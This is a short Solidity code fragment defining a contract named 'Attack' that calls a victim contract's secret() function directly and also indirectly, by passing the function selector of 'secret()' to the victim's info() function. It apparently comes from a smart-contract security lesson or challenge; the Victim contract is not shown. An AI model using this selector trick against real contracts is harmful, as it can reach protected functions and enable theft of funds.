contract Attack{
    function callsecret(Victim vic){
        vic.secret();
    }
    
    function callattack(Victim vic){
        vic.info(bytes4(keccak256("secret()")));
    }
}